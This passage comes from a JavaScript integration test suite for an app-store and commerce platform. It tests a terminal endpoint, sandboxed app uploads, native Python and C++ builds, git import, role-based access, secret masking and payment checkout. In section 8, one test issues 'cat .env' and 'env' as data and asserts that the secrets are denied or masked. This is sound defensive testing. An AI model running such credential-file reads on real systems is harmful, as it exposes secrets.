          Math.abs(p.predicted - p.expected) < 0.2,
          `XOR[${p.input}] predicted ${p.predicted} ≈ target ${p.expected}`
        );
      }
    });

    it('serves model-scored product recommendations', async () => {
      const recRes = await apiRequest('/api/neural/recommendations');
      assert.equal(recRes.status, 200);
      assert.ok(recRes.data.recommendations.length >= 3, 'model-backed recommendations');
      const scores = recRes.data.recommendations.map((r) => r.demandScore);
      assert.deepEqual(scores, [...scores].sort((a, b) => b - a), 'sorted by predicted demand');
    });
  });

  // ============================================================================
  // 8. REAL SYSTEM TERMINAL (OS TELEMETRY + SANDBOXED FS + SECRET MASKING)
  // ============================================================================
  describe('8. Real System Terminal (Live OS Commands & Sandboxed File Access)', () => {
    it('executes real OS telemetry commands (uname, free, ls)', async () => {
      const unameRes = await apiRequest('/api/terminal/exec', {
        method: 'POST',
        token: adminToken,
        body: { command: 'uname -a', actor: 'nex_root_admin@nex-store' }
      });
      assert.equal(unameRes.status, 200);
      assert.ok(unameRes.data.output.includes(process.version), 'uname reports the real Node runtime');
      assert.ok(/Linux|Darwin|Windows/i.test(unameRes.data.output), 'uname reports the real OS type');

      const freeRes = await apiRequest('/api/terminal/exec', {
        method: 'POST',
        token: adminToken,
        body: { command: 'free', actor: 'nex_root_admin@nex-store' }
      });
      assert.ok(freeRes.data.output.includes('Mem:'), 'free reports real memory');

      const lsRes = await apiRequest('/api/terminal/exec', {
        method: 'POST',
        token: adminToken,
        body: { command: 'ls', actor: 'nex_root_admin@nex-store' }
      });
      assert.ok(lsRes.data.output.includes('package.json'), 'ls lists real project files');
    });

    it('sandbox-denies sensitive file reads and masks secrets in env output', async () => {
      const denyRes = await apiRequest('/api/terminal/exec', {
        method: 'POST',
        token: adminToken,
        body: { command: 'cat .env', actor: 'nex_root_admin@nex-store' }
      });
      assert.equal(denyRes.status, 200);
      assert.ok(denyRes.data.output.includes('permission denied'), '.env must be unreadable');

      const envRes = await apiRequest('/api/terminal/exec', {
        method: 'POST',
        token: adminToken,
        body: { command: 'env', actor: 'nex_root_admin@nex-store' }
      });
      assert.ok(!/nex_whop_sk_|mongodb(\+srv)?:\/\//.test(envRes.data.output), 'env must not leak secret values');
      assert.ok(envRes.data.output.includes('[MASKED]') || envRes.data.output.includes('NODE_RUNTIME'), 'env works');
    });
  });

  // ============================================================================
  // 9. REAL APP PACKAGES (UPLOAD → INSTALL → PREVIEW → DOWNLOAD) & LINK HEALTH
  // ============================================================================
  describe('9. Real App Packages, Sandbox Preview & Live Link Health', () => {
    const PAYLOAD_MARKER = 'NEX_REAL_PACKAGE_PAYLOAD_MARKER_2026';
    const payloadHtml = `<!DOCTYPE html><html><head><title>Real Uploaded App</title></head>
<body><main><h1>Real App Runtime</h1><p>${PAYLOAD_MARKER}</p>
<script>document.title = 'boot-' + (1 + 1);</script></main></body></html>`;

    it('publishes a REAL uploaded HTML package with byte-exact size & SHA-256', async () => {
      const res = await apiRequest('/api/developer/publish', {
        method: 'POST',
        token: adminToken,
        body: {
          name: 'Real Payload Demo App',
          description: 'Integration test app with a genuine uploaded HTML package',
          version: '2.0.0',
          developer: 'nex_root_admin',
          source_provider: 'Netlify',
          live_url: 'https://nex-store-pro.netlify.app',
          html_payload: payloadHtml
        }
      });
      assert.equal(res.status, 201);
      uploadedAppId = res.data.app.id;

      const expectedBytes = Buffer.byteLength(payloadHtml, 'utf8');
      const expectedSha = createHash('sha256').update(payloadHtml, 'utf8').digest('hex');
      const expectedSizeLabel =
        expectedBytes >= 1048576
          ? `${(expectedBytes / 1048576).toFixed(1)} MB`
          : expectedBytes >= 1024
          ? `${(expectedBytes / 1024).toFixed(1)} KB`
          : `${expectedBytes} B`;
      assert.equal(res.data.app.sha256_hash, expectedSha, 'sha256 must hash the REAL payload bytes');
      assert.equal(res.data.app.size, expectedSizeLabel, 'size must be real byte size');

      // Sandbox preview serves the uploaded app verbatim
      const sandbox = await apiRequest(`/api/sandbox/${uploadedAppId}`);
      assert.equal(sandbox.status, 200);
      assert.ok(sandbox.data.includes(PAYLOAD_MARKER), 'sandbox must serve the real uploaded HTML');
      assert.ok(sandbox.data.includes('boot-'), 'uploaded script kept verbatim');

      // Package download returns real bytes with verified hash headers
      const pkg = await apiRequest(`/api/apps/${uploadedAppId}/package`);
      assert.equal(pkg.status, 200);
      assert.ok(pkg.data.includes(PAYLOAD_MARKER), 'package download = real payload bytes');
      assert.equal(pkg.headers.get('x-nex-package-sha256'), expectedSha, 'download hash matches');
      assert.equal(pkg.headers.get('x-nex-package-bytes'), String(expectedBytes), 'download byte count matches');
    });

    it('installs & uninstalls the real app with verified SHA records', async () => {
      const installRes = await apiRequest(`/api/apps/${uploadedAppId}/install`, {
        method: 'POST',
        token: adminToken
      });
      assert.equal(installRes.status, 201);
      assert.equal(installRes.data.installRecord.status, 'INSTALLED');
      assert.equal(
        installRes.data.installRecord.sha256_verified,
        createHash('sha256').update(payloadHtml, 'utf8').digest('hex')
      );

      const uninst = await apiRequest(`/api/apps/${uploadedAppId}/uninstall`, {
        method: 'DELETE',
        token: adminToken
      });
      assert.equal(uninst.status, 200);
    });

    it('performs a REAL live-link health check with honest results', async () => {
      const res = await apiRequest(`/api/apps/${uploadedAppId}/link-health`);
      assert.equal(res.status, 200);
      assert.equal(res.data.url, 'https://nex-store-pro.netlify.app');
      assert.ok(typeof res.data.reachable === 'boolean', 'honest reachability boolean');
      assert.ok(typeof res.data.latencyMs === 'number', 'measured latency');
      assert.ok(res.data.checkedAt, 'real check timestamp');
      if (!res.data.reachable) {
        assert.ok(/timed out|failed|blocked/i.test(res.data.note), 'failure note is honest');
      }
    });

    it('legacy seed apps without a payload still get the archetype sandbox runtime', async () => {
      const sandbox = await apiRequest('/api/sandbox/app-codesync-ide');
      assert.equal(sandbox.status, 200);
      assert.ok(sandbox.data.includes('<html') || sandbox.data.includes('<!DOCTYPE'));
      assert.ok(!sandbox.data.includes(PAYLOAD_MARKER), 'no foreign payload served');
    });
  });

  // ============================================================================
  // 10. INTEGER-CENT MONEY MATH (NO IEEE-754 DRIFT)
  // ============================================================================
  describe('10. Integer-Cent Money Math', () => {
    it('computeOrderMoney produces exact integer-cent totals', () => {
      // 3 × $10.10 = $30.30 exactly (float math: 30.299999999999997)
      const m1 = computeOrderMoney({
        unitPrices: [10.1, 10.1, 10.1],
        quantities: [1, 1, 1],
        coupon: null,
        shippingMethod: 'standard'
      });
      assert.equal(m1.subtotalCents, 3030, 'subtotal is exact cents');
      assert.equal(m1.subtotal, 30.3);
      assert.equal(m1.taxCents, Math.round(3030 * 0.08), 'tax from cents');
      assert.equal(m1.totalCents, 3030 + 1200 + m1.taxCents, 'total composes exactly in cents');

      // Percentage coupon: 20% of $400.10 = $80.02 exactly
      const m2 = computeOrderMoney({
        unitPrices: [400.1],
        quantities: [1],
        coupon: { discount_type: 'percentage', discount_value: 20, min_order_amount: 400 },
        shippingMethod: 'same-day'
      });
      assert.equal(m2.discountCents, 8002, 'percent discount rounds to exact cents');
      assert.equal(m2.discountAmount, 80.02);

      // Tiny prices never drift: 7 × $0.15 = $1.05
      const m3 = computeOrderMoney({
        unitPrices: [0.15, 0.15, 0.15, 0.15, 0.15, 0.15, 0.15],
        quantities: [1, 1, 1, 1, 1, 1, 1],
        coupon: null,
        shippingMethod: 'standard'
      });
      assert.equal(m3.subtotalCents, 105);
      assert.equal(m3.subtotal, 1.05);
    });

    it('coupon validation discounts in exact cents', async () => {
      const res = await apiRequest('/api/coupons/validate', {
        method: 'POST',
        body: { code: 'NEX20', subtotal: 400.1 }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.discountCents, 8002);
      assert.equal(res.data.discountAmount, 80.02);
    });

    it('guest checkout totals are exact to the cent (subtotal/tax/total)', async () => {
      // Price a product at $10.10 and buy 3 — float math gives 30.299999999999997.
      // Explicit stock setup keeps the test deterministic across runs (the test
      // database persists between npm test invocations).
      const prod = db.prepare('SELECT * FROM products LIMIT 1').get();
      db.prepare('UPDATE products SET stock = 10 WHERE id = ?').run(prod.id);
      await apiRequest(`/api/products/${prod.id}`, {
        method: 'PATCH',
        token: adminToken,
        body: { price: 10.1 }
      });

      const res = await apiRequest('/api/orders', {
        method: 'POST',
        body: {
          customer_name: 'Cent Precise',
          customer_email: 'cents@nexstore.dev',
          customer_phone: '+254700000001',
          shipping_address: '1 Integer Cent Way',
          shipping_city: 'Nairobi',
          shipping_country: 'Kenya',
          shipping_method: 'Standard Ground (3-5 days)',
          payment_method: 'Card',
          items: [{ product_id: prod.id, quantity: 3 }]
        }
      });
      assert.equal(res.status, 201);
      const order = res.data.order;
      assert.equal(order.subtotal, 30.3, 'subtotal exact (3 × $10.10)');
      assert.equal(order.tax_amount, 2.42, 'tax exact (8% of 3030¢ = 242¢)');
      assert.equal(order.shipping_cost, 12);
      assert.equal(order.total, 44.72, 'total exact (3030 + 1200 + 242 ¢)');
      for (const key of ['subtotal', 'discount_amount', 'shipping_cost', 'tax_amount', 'total']) {
        assert.ok(Math.abs(order[key] * 100 - Math.round(order[key] * 100)) < 1e-9, `${key} has ≤2 decimal places`);
      }
    });
  });

  // ============================================================================
  // 11. POLYGLOT CONVERSION PIPELINE (REAL TOOLCHAIN BUILDS ON UPLOAD)
  // ============================================================================
  describe('11. Polyglot Conversion & Installability (Flutter, C++, Python, TS)', () => {
    async function publishWithSource(payload) {
      const res = await apiRequest('/api/developer/publish', {
        method: 'POST',
        token: adminToken,
        body: payload
      });
      assert.equal(res.status, 201);
      return res.data.app.id;
    }

    it('TypeScript project is REALLY bundled with esbuild and runs in the sandbox', async () => {
      const tsAppId = await publishWithSource({
        name: 'TS Conversion Probe',
        language: 'typescript',
        entry_file: 'main.ts',
        source_files: {
          'main.ts': "import { tag } from './util'; document.title = tag('NEX_TS_RUNS');",
          'util.ts': "export function tag(s: string): string { return 'BUNDLED_' + s; }"
        }
      });
      const build = await apiRequest(`/api/apps/${tsAppId}/build`);
      assert.equal(build.status, 200);
      assert.equal(build.data.status, 'TRANSPILED', 'real esbuild transpile');
      assert.ok(/esbuild/.test(build.data.toolchain), 'toolchain named honestly');
      assert.ok(build.data.log.includes('nex_bundle.out.js'), 'real bundle artifact logged');

      const sandbox = await apiRequest(`/api/sandbox/${tsAppId}`);
      assert.ok(sandbox.data.includes('NEX_TS_RUNS') && sandbox.data.includes('BUNDLED_'), 'transpiled+inlined bundle is in the runner');
    });

    it('Python project is validated by real py_compile and executes natively on /run', async () => {
      const pyAppId = await publishWithSource({
        name: 'Python Conversion Probe',
        language: 'python',
        source_files: { 'main.py': 'print("NEX_PY_EXEC_OK")' }
      });
      const build = await apiRequest(`/api/apps/${pyAppId}/build`);
      assert.equal(build.data.status, 'VALIDATED', 'real python3 -m py_compile');
      assert.ok(/Python 3/.test(build.data.toolchain));

      const run = await apiRequest(`/api/apps/${pyAppId}/run`, { method: 'POST' });
      assert.equal(run.status, 200);
      assert.equal(run.data.exitCode, 0);
      assert.ok(run.data.stdout.includes('NEX_PY_EXEC_OK'), 'real interpreter stdout');
      assert.equal(run.data.ranNative, true);
    });

    it('C++ project is REALLY compiled with g++ and its binary executes on /run', async () => {
      const cppAppId = await publishWithSource({
        name: 'C++ Conversion Probe',
        language: 'cpp',
        source_files: {
          'main.cpp': '#include <iostream>\nint main(){ std::cout << "NEX_CPP_EXEC_OK" << std::endl; return 0; }'
        }
      });
      const build = await apiRequest(`/api/apps/${cppAppId}/build`);
      assert.equal(build.data.status, 'COMPILED', 'real g++ compile+link');
      assert.ok(/g\+\+/.test(build.data.toolchain));
      assert.ok(/compiled & linked/.test(build.data.log), 'real linker log');

      const run = await apiRequest(`/api/apps/${cppAppId}/run`, { method: 'POST' });
      assert.equal(run.data.exitCode, 0);
      assert.ok(run.data.stdout.includes('NEX_CPP_EXEC_OK'), 'real compiled-binary stdout');
    });

    it('Flutter project without an SDK converts HONESTLY and stays installable as a real ZIP bundle', async () => {
      const flAppId = await publishWithSource({
        name: 'Flutter Conversion Probe',
        language: 'flutter',
        source_files: {
          'pubspec.yaml': 'name: fl_probe\nversion: 1.0.0\ndescription: probe app',
          'lib/main.dart': 'void main() { print("flutter probe"); }'
        }
      });
      const build = await apiRequest(`/api/apps/${flAppId}/build`);
      // Either the SDK exists (VALIDATED) or the honest missing-toolchain status:
      assert.ok(
        ['TOOLCHAIN_UNAVAILABLE', 'VALIDATED'].includes(build.data.status),
        `honest status, got ${build.data.status}`
      );
      if (build.data.status === 'TOOLCHAIN_UNAVAILABLE') {
        assert.ok(/NOT DETECTED/.test(build.data.toolchain), 'honest probe result');
        assert.ok(/Flutter/.test(build.data.log), 'honest log explains SDK requirement');
      }

      const bundle = await apiRequest(`/api/apps/${flAppId}/bundle.zip`);
      assert.equal(bundle.status, 200);
      const zipBytes = Buffer.from(bundle.data, 'binary');
      assert.equal(zipBytes.slice(0, 2).toString(), 'PK', 'real ZIP archive');
      assert.ok(zipBytes.includes('lib/main.dart'), 'source preserved in bundle');
      assert.ok(zipBytes.includes('pubspec.yaml'), 'pubspec preserved in bundle');
    });

    it('invalid source fails the real build with the genuine compiler error (no fake success)', async () => {
      const badAppId = await publishWithSource({
        name: 'Broken Python Probe',
        language: 'python',
        source_files: { 'main.py': 'def broken(:\n  pass' }
      });
      const build = await apiRequest(`/api/apps/${badAppId}/build`);
      assert.equal(build.data.status, 'INVALID', 'real py_compile failure');
      assert.ok(/py_compile FAILED/.test(build.data.log), 'genuine error log');
    });
  });

  // ============================================================================
  // 12. REAL GIT IMPORT (CLONE → SOURCE TREE → CONVERT → INSTALL)
  // ============================================================================
  describe('12. Real Git Import Pipeline', () => {
    it('detects language and entry points from real project structure', () => {
      assert.equal(
        detectProjectLanguage({ 'pubspec.yaml': 'name: x', 'lib/main.dart': 'void main() {}' }).language,
        'flutter'
      );
      assert.equal(detectProjectLanguage({ 'main.cpp': 'int main(){}', 'CMakeLists.txt': 'x' }).language, 'cpp');
      assert.equal(detectProjectLanguage({ 'requirements.txt': 'flask', 'app.py': 'x' }).language, 'python');
      assert.equal(detectProjectLanguage({ 'tsconfig.json': '{}', 'src/main.ts': 'x' }).language, 'typescript');
      assert.equal(detectProjectLanguage({ 'Cargo.toml': '[package]' }).language, 'rust');
      assert.equal(detectProjectLanguage({ 'go.mod': 'module x' }).language, 'go');
    });

    it('collects a real source tree with honest caps and skips', () => {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nex_collect_'));
      try {
        fs.mkdirSync(path.join(dir, 'lib'));
        fs.mkdirSync(path.join(dir, 'node_modules'));
        fs.writeFileSync(path.join(dir, 'pubspec.yaml'), 'name: probe');
        fs.writeFileSync(path.join(dir, 'lib', 'main.dart'), 'void main() {}');
        fs.writeFileSync(path.join(dir, 'node_modules', 'junk.js'), 'x');
        fs.writeFileSync(path.join(dir, 'photo.png'), 'binary-ish');
        const { files, fileCount, skipped } = collectSourceFiles(dir);
        assert.equal(fileCount, 2);
        assert.ok(files['lib/main.dart'] && files['pubspec.yaml']);
        assert.ok(!files['node_modules/junk.js'], 'node_modules skipped');
        assert.ok(skipped.wrongType >= 1, 'non-source files honestly skipped');
      } finally {
        fs.rmSync(dir, { recursive: true, force: true });
      }
    });

    it('really clones a public GitHub repo and publishes its actual files', async () => {
      const res = await apiRequest('/api/apps/import-git', {
        method: 'POST',
        token: adminToken,
        body: { url: 'https://github.com/octocat/Hello-World' }
      });
      assert.equal(res.status, 201);
      assert.ok(/^[0-9a-f]{40}$/.test(res.data.importedFrom.commit), 'real commit SHA from git');
      assert.ok(res.data.importedFrom.fileCount >= 1, 'actual repo files imported');
      assert.ok(res.data.app.id, 'app published from the cloned tree');
      const build = await apiRequest(`/api/apps/${res.data.app.id}/build`);
      assert.ok(build.status === 200 && build.data.log, 'conversion report recorded');
    });

    it('full chain: local git repo → clone → language detect → real convert → real run', async () => {
      // Build a genuine git repository on disk first.
      const repoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nex_gitrepo_'));
      try {
        fs.writeFileSync(path.join(repoDir, 'main.py'), 'print("GIT_IMPORT_RUN_OK")\n');
        fs.writeFileSync(path.join(repoDir, 'README.md'), '# probe\n');
        execFileSync('git', ['-C', repoDir, 'init', '--quiet'], { timeout: 5000 });
        execFileSync('git', ['-C', repoDir, 'add', '.'], { timeout: 5000 });
        execFileSync('git', ['-C', repoDir, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-m', 'probe', '--quiet'], {
          timeout: 5000
        });

        const res = await apiRequest('/api/apps/import-git', {
          method: 'POST',
          token: adminToken,
          body: { url: `file://${repoDir}` }
        });
        assert.equal(res.status, 201);
        assert.equal(res.data.app.language, 'python', 'language detected from project structure');
        assert.equal(res.data.importedFrom.fileCount, 2, 'both real files imported');

        const build = await apiRequest(`/api/apps/${res.data.app.id}/build`);
        assert.equal(build.data.status, 'VALIDATED', 'real py_compile on the cloned tree');

        const run = await apiRequest(`/api/apps/${res.data.app.id}/run`, { method: 'POST' });
        assert.equal(run.data.exitCode, 0);
        assert.ok(run.data.stdout.includes('GIT_IMPORT_RUN_OK'), 'cloned code really executes');
      } finally {
        fs.rmSync(repoDir, { recursive: true, force: true });
      }
    });

    it('RBAC: normal users cannot import from git', async () => {
      const res = await apiRequest('/api/apps/import-git', {
        method: 'POST',
        token: userAmaraToken,
        body: { url: 'https://github.com/octocat/Hello-World' }
      });
      assert.equal(res.status, 403);
    });
  });

  // ============================================================================
  // 13. ROLE-BASED NAVIGATION POLICY (ADMINS / DEVELOPERS / USERS / GUESTS)
  // ============================================================================
  describe('13. Role-Based Navigation Separation', () => {
    const ALL_TABS = ['store', 'apps', 'mobile-subs', 'tracker', 'docs', 'overview', 'subsystems', 'admin', 'database', 'developer-portal', 'user-portal'];

    it('guests see only public surfaces', () => {
      const visible = ALL_TABS.filter((t) => canRoleAccessTab('guest', t));
      assert.deepEqual(visible.sort(), ['apps', 'docs', 'mobile-subs', 'store', 'tracker'].sort());
    });

    it('users get public + user portal only (never admin/dev surfaces)', () => {
      const visible = ALL_TABS.filter((t) => canRoleAccessTab('user', t));
      assert.deepEqual(visible.sort(), ['apps', 'docs', 'mobile-subs', 'store', 'tracker', 'user-portal'].sort());
    });

    it('developers get public + developer portal only', () => {
      const visible = ALL_TABS.filter((t) => canRoleAccessTab('developer', t));
      assert.deepEqual(visible.sort(), ['apps', 'developer-portal', 'docs', 'mobile-subs', 'store', 'tracker'].sort());
    });

    it('admins see every workspace', () => {
      for (const t of ALL_TABS) assert.ok(canRoleAccessTab('admin', t), `admin must access ${t}`);
    });

    it('nav item filtering matches the router policy', () => {
      const items = ALL_TABS.map((id) => ({ id, label: id }));
      assert.equal(filterNavForRole(items, 'guest').length, 5);
      assert.equal(filterNavForRole(items, 'user').length, 6);
      assert.equal(filterNavForRole(items, 'developer').length, 6);
      assert.equal(filterNavForRole(items, 'admin').length, ALL_TABS.length);
      // explicit roles override (e.g. admin-only command palette actions)
      const cmdItems = [{ id: 'cmd-pulse', roles: ['admin'] }, { id: 'cmd-theme' }];
      assert.equal(filterNavForRole(cmdItems, 'guest').length, 1);
      assert.equal(filterNavForRole(cmdItems, 'admin').length, 2);
    });

    it('session role resolution and policy table stay consistent', () => {
      assert.equal(roleForSession({ account: { role: 'developer' } }), 'developer');
      assert.equal(roleForSession(null), 'guest');
      assert.ok(TAB_ROLE_ACCESS['developer-portal'].includes('developer'));
      assert.ok(!TAB_ROLE_ACCESS['user-portal'].includes('developer'));
    });
  });

  // ============================================================================
  // 14. ROOT ADMIN ENV CREDENTIAL BOOTSTRAP (WITH /api/bootstrap)
  // ============================================================================
  describe('14. Root Admin Env-Credential Bootstrap', () => {
    it('bootstraps REAL admin credentials (no CHANGE_ME placeholders survive)', () => {
      const envAdmin = getEnvAdminConfig();
      assert.ok(envAdmin.envLoaded, 'env admin fully configured after boot');
      assert.ok(!/CHANGE_?ME/i.test(envAdmin.password), 'placeholder password must be replaced');
      assert.ok(!/CHANGE_?ME/i.test(envAdmin.masterToken || 'x'), 'placeholder master token must be replaced');
      assert.ok(envAdmin.password.length >= 20, 'generated password is strong');
    });

    it('/api/bootstrap carries the credential-bootstrap status but NEVER the secrets', async () => {
      const res = await apiRequest('/api/bootstrap');
      assert.equal(res.status, 200);
      const cfg = res.data.authConfig;
      assert.equal(cfg.envAdminConfigured, true);
      assert.equal(cfg.adminUsernameHint, 'nex_root_admin');
      assert.ok(typeof cfg.credentialsBootstrapped === 'boolean');
      assert.ok(/never exposed via API/.test(cfg.passwordSource), 'honest secret-source note');

      const envAdmin = getEnvAdminConfig();
      const raw = JSON.stringify(res.data);
      assert.ok(!raw.includes(envAdmin.password), 'bootstrap must never leak the admin password');
      assert.ok(!raw.includes(envAdmin.masterToken), 'bootstrap must never leak the master token');
    });

    it('/api/auth/config exposes hints + bootstrap status only', async () => {
      const res = await apiRequest('/api/auth/config');
      assert.equal(res.status, 200);
      assert.equal(res.data.envAdminConfigured, true);
      assert.equal(res.data.adminUsernameHint, 'nex_root_admin');
      assert.ok(res.data.envSource.includes('.env'));
      const envAdmin = getEnvAdminConfig();
      assert.ok(!JSON.stringify(res.data).includes(envAdmin.password), 'no password in auth config');
    });

    it('Root Admin can log in with the bootstrapped env credentials', async () => {
      const envAdmin = getEnvAdminConfig();
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: { identifier: 'nex_root_admin', password: envAdmin.password }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.account.role, 'admin');
      assert.equal(res.data.account.username, 'nex_root_admin');
      assert.ok(res.data.token, 'session token issued');
    });
  });

  // ============================================================================
  // 15. SYSTEM-WIDE CHECK (MEMORY / RESOURCES / CONFIGS / REQUESTS / GRAPHS)
  // ============================================================================
  describe('15. System-Wide Check Dashboard', () => {
    it('guests and normal users cannot inspect the system', async () => {
      const anon = await apiRequest('/api/system/check');
      assert.equal(anon.status, 401);
      const user = await apiRequest('/api/system/check', { token: userAmaraToken });
      assert.equal(user.status, 403);
    });

    it('developers get real metrics, uploaded systems, graphs and recommendations', async () => {
      const res = await apiRequest('/api/system/check', { token: devAetherToken });
      assert.equal(res.status, 200);
      const d = res.data;
      assert.ok(d.healthScore >= 0 && d.healthScore <= 100, 'health score in range');
      assert.ok(['HEALTHY', 'DEGRADED', 'CRITICAL'].includes(d.status));

      // memory / resources — measured values, never fabricated
      assert.ok(d.metrics.process.rssMb > 0, 'real RSS');
      assert.ok(d.metrics.process.heapUsedMb > 0, 'real heap usage');
      assert.ok(d.metrics.system.cpuCount >= 1, 'real CPU count');
      assert.ok(d.metrics.system.totalMemMb > 0, 'real system memory');
      assert.ok(Array.isArray(d.metrics.memorySeries), 'memory graph time series');

      // request telemetry from actual traffic
      assert.ok(d.metrics.requests.total >= 1, 'requests are counted');
      assert.ok(Array.isArray(d.metrics.requests.topRoutes), 'per-route request table');
      assert.ok(typeof d.metrics.requests.p95Ms === 'number');

      // uploaded systems + app status + reports
      assert.ok(Array.isArray(d.uploadedSystems), 'converted systems listed');
      assert.ok(typeof d.buildStatusCounts === 'object');
      assert.ok(typeof d.dbStats === 'object' && d.dbStats !== null);
      assert.ok(typeof d.apps.total === 'number');

      // honest recommendations
      assert.ok(Array.isArray(d.recommendations), 'recommendations are computed');
      for (const r of d.recommendations) {
        assert.ok(['critical', 'warning', 'info'].includes(r.severity));
        assert.ok(r.title && r.detail && r.action, 'each recommendation is actionable');
      }

      // config is masked for non-admins but never leaks values
      assert.equal(d.config.restricted, true, 'developer view masks config detail');
    });

    it('admins get full config status (flags only, never secret values)', async () => {
      const res = await apiRequest('/api/system/check', { token: adminToken });
      assert.equal(res.status, 200);
      assert.ok(!res.data.config.restricted);
      assert.ok(typeof res.data.config.adminMasterTokenConfigured === 'boolean');
      const envAdmin = getEnvAdminConfig();
      assert.ok(!JSON.stringify(res.data).includes(envAdmin.password), 'no secrets in system check');
    });
  });

  // ============================================================================
  // 16. DEVELOPER SHARING (SYSTEMS / APPS → COMMUNITY FEED)
  // ============================================================================
  describe('16. Developer Sharing', () => {
    let sharedSlug = '';

    it('guests cannot share; users are RBAC-blocked', async () => {
      const anon = await apiRequest('/api/apps/some-app/share', { method: 'POST', body: { message: 'x' } });
      assert.equal(anon.status, 401);
      const user = await apiRequest('/api/apps/some-app/share', {
        method: 'POST',
        token: userAmaraToken,
        body: { message: 'x' }
      });
      assert.equal(user.status, 403);
    });

    it('a developer shares a system → public community feed lists it', async () => {
      const apps = await apiRequest('/api/apps');
      const target = apps.data.apps.find((a) => a.name) || apps.data.apps[0];
      const res = await apiRequest(`/api/apps/${target.id}/share`, {
        method: 'POST',
        token: devAetherToken,
        body: { message: 'Freshly converted quantum system — feedback welcome', kind: 'system' }
      });
      assert.equal(res.status, 201);
      assert.ok(res.data.share.slug, 'public slug generated');
      assert.ok(res.data.shareUrl.includes(res.data.share.slug));
      sharedSlug = res.data.share.slug;

      const pub = await apiRequest('/api/shares');
      assert.equal(pub.status, 200, 'community feed is public');
      assert.ok(pub.data.shares.some((s) => s.slug === sharedSlug), 'share visible publicly');
      const mine = pub.data.shares.find((s) => s.slug === sharedSlug);
      assert.equal(mine.message, 'Freshly converted quantum system — feedback welcome');
    });

    it('authors can unshare; strangers cannot', async () => {
      const shares = await apiRequest('/api/shares');
      const mine = shares.data.shares.find((s) => s.slug === sharedSlug);
      const stranger = await apiRequest(`/api/shares/${mine.id}`, { method: 'DELETE', token: userAmaraToken });
      assert.equal(stranger.status, 403);
      const author = await apiRequest(`/api/shares/${mine.id}`, { method: 'DELETE', token: devAetherToken });
      assert.equal(author.status, 200);
    });
  });

  // ============================================================================
  // 17. COLLABORATIVE PLATFORM (REVIEWS + THREADED COMMENTS)
  // ============================================================================
  describe('17. Collaborative Reviews & Comments', () => {
    let appId = '';

    it('reviews are public to read, auth to post, and rated 1-5 only', async () => {
      const apps = await apiRequest('/api/apps');
      appId = (apps.data.apps.find((a) => a.name) || apps.data.apps[0]).id;

      const anon = await apiRequest(`/api/apps/${appId}/reviews`, {
        method: 'POST',
        body: { rating: 5, body: 'nope' }
      });
      assert.equal(anon.status, 401);

      const bad = await apiRequest(`/api/apps/${appId}/reviews`, {
        method: 'POST',
        token: userAmaraToken,
        body: { rating: 7, body: 'out of range' }
      });
      assert.equal(bad.status, 422);

      const post = await apiRequest(`/api/apps/${appId}/reviews`, {
        method: 'POST',
        token: userAmaraToken,
        body: { rating: 4, body: 'Solid build pipeline, fast previews.' }
      });
      assert.equal(post.status, 201);
      assert.equal(post.data.review.rating, 4);

      const list = await apiRequest(`/api/apps/${appId}/reviews`);
      assert.equal(list.status, 200, 'reviews readable publicly');
      assert.ok(list.data.summary.count >= 1);
      assert.ok(list.data.summary.avg >= 1 && list.data.summary.avg <= 5, 'average derived from real rows');
    });

    it('comments support threaded replies and validate parents', async () => {
      const root = await apiRequest(`/api/apps/${appId}/comments`, {
        method: 'POST',
        token: devAetherToken,
        body: { body: 'Happy to answer questions about the conversion pipeline.' }
      });
      assert.equal(root.status, 201);

      const reply = await apiRequest(`/api/apps/${appId}/comments`, {
        method: 'POST',
        token: userAmaraToken,
        body: { body: 'How did you handle the toolchain detection?', parent_id: root.data.comment.id }
      });
      assert.equal(reply.status, 201);
      assert.equal(reply.data.comment.parent_id, root.data.comment.id, 'reply is threaded');

      const orphan = await apiRequest(`/api/apps/${appId}/comments`, {
        method: 'POST',
        token: userAmaraToken,
        body: { body: 'bad parent', parent_id: 'cmt_doesnotexist' }
      });
      assert.equal(orphan.status, 422);

      const list = await apiRequest(`/api/apps/${appId}/comments`);
      assert.ok(list.data.comments.length >= 2, 'thread publicly readable');
    });
  });

  // ============================================================================
  // 18. REAL PAYMENT PROVIDERS & HONEST CHECKOUT (STRIPE / PAYPAL / M-PESA)
  // ============================================================================
  describe('18. Payment Providers & Honest Checkout', () => {
    let prodId = '';

    it('payments config exposes real provider flags and never secrets', async () => {
      const res = await apiRequest('/api/payments/config');
      assert.equal(res.status, 200);
      const cfg = res.data;
      assert.equal(cfg.providers.test.configured, true, 'Test Ledger always available');
      assert.equal(cfg.providers.test.mode, 'test');
      for (const id of ['stripe', 'paypal', 'mpesa']) {
        assert.ok(typeof cfg.providers[id].configured === 'boolean', `${id} flag is a boolean`);
        assert.ok(cfg.providers[id].note, `${id} carries an honest note`);
      }
      const raw = JSON.stringify(cfg);
      assert.ok(!raw.includes('sk_'), 'no Stripe secret material');
      assert.ok(!raw.includes('access_token'), 'no gateway tokens');
    });

    it('Test Ledger checkout settles honestly as TEST_SETTLED (sandbox), never "Live"', async () => {
      const products = await apiRequest('/api/products');
      prodId = (products.data.products || products.data)[0].id;
      const res = await apiRequest('/api/orders', {
        method: 'POST',
        body: {
          customer_name: 'Ledger Tester',
          customer_email: 'ledger@nexstore.dev',
          shipping_address: '1 Sandbox Way',
          shipping_city: 'Nairobi',
          shipping_country: 'Kenya',
          shipping_method: 'Standard Ground (3-5 days)',
          payment_provider: 'test',
          items: [{ product_id: prodId, quantity: 1 }]
        }
      });
      assert.equal(res.status, 201);
      const tx = res.data.paymentTransaction;
      assert.equal(tx.status, 'TEST_SETTLED');
      assert.equal(tx.mode, 'test');
      assert.ok(/Test Ledger/.test(tx.provider), 'provider honestly labeled sandbox');
      assert.ok(!/Live/i.test(tx.provider), 'sandbox must never claim "Live"');
      assert.ok(tx.provider_ref.startsWith('tl_'), 'real ledger reference recorded');
      assert.ok(res.data.payment.status === 'TEST_SETTLED');
    });

    it('unconfigured live providers fail honestly — no fabricated SETTLED rows', async () => {
      const cfg = await apiRequest('/api/payments/config');
      if (cfg.data.providers.stripe.configured) return; // real key present in this env — skip
      const before = await apiRequest('/api/payments', { token: adminToken });
      const beforeCount = before.data.paymentTransactions.length;

      const res = await apiRequest('/api/orders', {
        method: 'POST',
        body: {
